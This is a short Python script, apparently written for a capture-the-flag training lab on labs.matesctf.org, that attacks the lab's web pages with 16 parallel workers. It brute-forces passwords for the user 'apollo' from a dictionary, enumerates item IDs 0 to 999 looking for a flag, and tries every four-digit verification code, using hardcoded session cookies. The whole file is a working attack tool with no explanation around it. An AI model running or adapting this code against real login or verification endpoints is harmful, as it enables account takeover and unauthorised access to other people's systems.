from dictionary import *
import requests
from multiprocessing import Pool
from itertools import product


def send_login(username, password):
    url = 'https://labs.matesctf.org/lab/auth/3/index.php?page=login'

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    cookies = {'PHPSESSID': 'c75f26a7ec74f3dc9d860ee27d9e7835'}

    data = {'username': username,
            'password': password}

    response = requests.post(url=url,
                             headers=headers,
                             cookies=cookies,
                             data=data,
                             allow_redirects=False)

    # if response.text.find('username or password not correct') == -1:
    #     print((username, password))

    if response.status_code == 302:
        print((response.status_code, username, password))


def send_verify_code(code):
    url = 'https://labs.matesctf.org/lab/auth/6/index.php?page=verifyCode'

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    cookies = {'PHPSESSID': '0ce8cdb18879bb5496c22012ede06d39'}

    data = {'code': code}

    response = requests.post(url=url,
                             headers=headers,
                             cookies=cookies,
                             data=data,
                             allow_redirects=False)

    # print(response.text)
    if response.status_code == 302:
        print(code)


def get_item(item_id):
    url = 'https://labs.matesctf.org/lab/auth/2/index.php?page=item'

    headers = {}

    cookies = {'PHPSESSID': 'c75f26a7ec74f3dc9d860ee27d9e7835'}

    params = {'id': item_id}

    response = requests.get(url=url,
                            headers=headers,
                            cookies=cookies,
                            params=params,
                            allow_redirects=False)

    if response.text.find('Flag') != -1:
        print(item_id)


def brute_force():
    dictionary = get_dictionary()
    usernames, passwords = dictionary.usernames, dictionary.passwords

    with Pool(16) as p:
        p.starmap(send_login, product(['apollo'], passwords))


def brute_force_item():
    with Pool(16) as p:
        p.map(get_item, range(0, 1000))


def brute_force_code():
    with Pool(16) as p:
        p.map(send_verify_code, range(1000, 10000))


if __name__ == '__main__':
    # send_login('username', 'password')
    # brute_force()
    # brute_force_item()
    # send_verify_code(8581)
    brute_force_code()
    # send_login('bien', 'test')
    # brute_force()

    # send_verify_code(3758)
